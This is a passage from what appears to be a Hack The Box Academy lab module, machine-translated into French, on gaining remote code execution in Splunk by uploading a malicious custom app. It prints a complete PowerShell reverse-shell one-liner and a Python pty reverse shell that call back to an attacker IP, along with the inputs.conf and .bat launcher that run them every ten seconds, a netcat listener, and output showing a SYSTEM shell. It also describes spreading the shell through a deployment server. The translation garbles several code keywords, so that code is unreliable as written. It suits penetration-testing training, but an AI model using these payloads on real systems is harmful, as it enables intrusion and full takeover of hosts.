Splunk attaquant
================

* * * * *

Comme indiqué dans la section précédente, nous pouvons obtenir l'exécution de code à distance sur Splunk en créant une application personnalisée pour exécuter des scripts Python, Batch, Bash ou PowerShell. Lors de l'analyse de découverte de Nmap, nous avons remarqué que notre cible est un serveur Windows. Étant donné que Splunk est livré avec Python installé, nous pouvons créer une application Splunk personnalisée qui nous permet d'exécuter du code à distance à l'aide de Python ou d'un script PowerShell.

* * * * *

Abus des fonctionnalités intégrées
------------------------------

Nous pouvons utiliser [ce](https://github.com/0xjpuff/reverse_shell_splunk) paquet Splunk pour nous aider. Le répertoire `bin` de ce référentiel contient des exemples pour [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) et [PowerShell](https://github. com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Passons en revue cette étape par étape.

Pour ce faire, nous devons d'abord créer une application Splunk personnalisée en utilisant la structure de répertoires suivante.

```
dsgsec@htb[/htb]$ arbre splunk_shell/

splunk_shell/
├── poubelle
└── par défaut

2 répertoires, 0 fichiers

```

Le répertoire `bin` contiendra tous les scripts que nous avons l'intention d'exécuter (dans ce cas, un reverse shell PowerShell), et le répertoire par défaut contiendra notre fichier `inputs.conf`. Notre coque inversée sera une doublure PowerShell.

```
#Une coque inversée simple et petite. Options et aide supprimées pour économiser de l'espace.
# Décommentez et modifiez l'adresse IP et le numéro de port codés en dur dans la ligne ci-dessous. Supprimez également tous les commentaires d'aide.
$client = Nouvel objet System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0} ;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding ]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

Le fichier [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) indique à Splunk le script à exécuter et toute autre condition. Ici, nous définissons l'application comme activée et demandons à Splunk d'exécuter le script toutes les 10 secondes. L'intervalle est toujours en secondes et l'entrée (script) ne s'exécutera que si ce paramètre est présent.

```
dsgsec@htb[/htb]$ cat inputs.conf

[script://./bin/rev.py]
désactivé = 0
intervalle = 10
type de source = shell

[script://.\bin\run.bat]
désactivé = 0
type de source = shell
intervalle = 10

```

Nous avons besoin du fichier .bat, qui s'exécutera lorsque l'application sera déployée et exécutera le one-liner PowerShell.

```
@ÉCHO OFF
PowerShell.exe -exec bypass -w caché -Commande "& '%~dpn0.ps1'"
Sortie

```

Une fois les fichiers créés, nous pouvons créer un fichier tarball ou `.spl` .

```
dsgsec@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/par défaut/
splunk_shell/default/inputs.conf

```

L'étape suivante consiste à choisir `Installer l'application à partir du fichier` et à télécharger l'application.

![](https://academy.hackthebox.com/storage/modules/113/install_app.png)

Avant de télécharger l'application personnalisée malveillante, démarrons un écouteur à l'aide de Netcat ou [socat](https://linux.die.net/man/1/socat).

```
dsgsec@htb[/htb]$ sudo nc -lnvp 443

écoute sur [tout] 443 ...

```

Sur la page `Télécharger l'application` , cliquez sur parcourir, choisissez l'archive que nous avons créée précédemment et cliquez sur `Télécharger`.

![](https://academy.hackthebox.com/storage/modules/113/upload_app.png)

Dès que nous téléchargeons l'application, un reverse shell est reçu car le statut de l'application passe automatiquement à `Activé`.

```
dsgsec@htb[/htb]$ sudo nc -lnvp 443

écoute sur [tout] 443 ...
se connecter à [10.10.14.15] depuis (INCONNU) [10.129.201.50] 53145

PS C:\Windows\system32> whoami

autorité nt\système

PS C:\Windows\system32> nom d'hôte

APP03

PS C:\Windows\system32>

```

Dans ce cas, nous avons récupéré un shell sous le nom `NT AUTHORTY\SYSTEM`. S'il s'agissait d'une évaluation du monde réel, nous pourrions procéder à l'énumération de la cible des informations d'identification dans le registre, la mémoire ou stockées ailleurs sur le système de fichiers à utiliser pour le mouvement latéral au sein du réseau. S'il s'agissait de notre point de départ initial dans l'environnement de domaine, nous pourrions utiliser cet accès pour commencer à énumérer le domaine Active Directory.

Si nous avions affaire à un hôte Linux, nous aurions besoin de modifier le script Python `rev.py` avant de créer l'archive tar et de télécharger l'application malveillante personnalisée. Le reste du processus serait le même, et nous obtiendrions une connexion shell inversée sur notre écouteur Netcat et partirions pour les courses.

Code : python

```
importer sys, socket, système d'exploitation, pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) pour fd dans (0,1,2)]
pty.spawn('/bin/bash')

```

Si l'hôte Splunk compromis est un serveur de déploiement, il sera probablement possible d'obtenir RCE sur n'importe quel hôteavec Universal Forwarders installés dessus. Pour pousser un reverse shell vers d'autres hôtes, l'application doit être placée dans le répertoire `$SPLUNK_HOME/etc/deployment-apps` sur l'hôte compromis. Dans un environnement Windows lourd, nous devrons créer une application à l'aide d'un shell inversé PowerShell car les redirecteurs universels ne s'installent pas avec Python comme le serveur Splunk.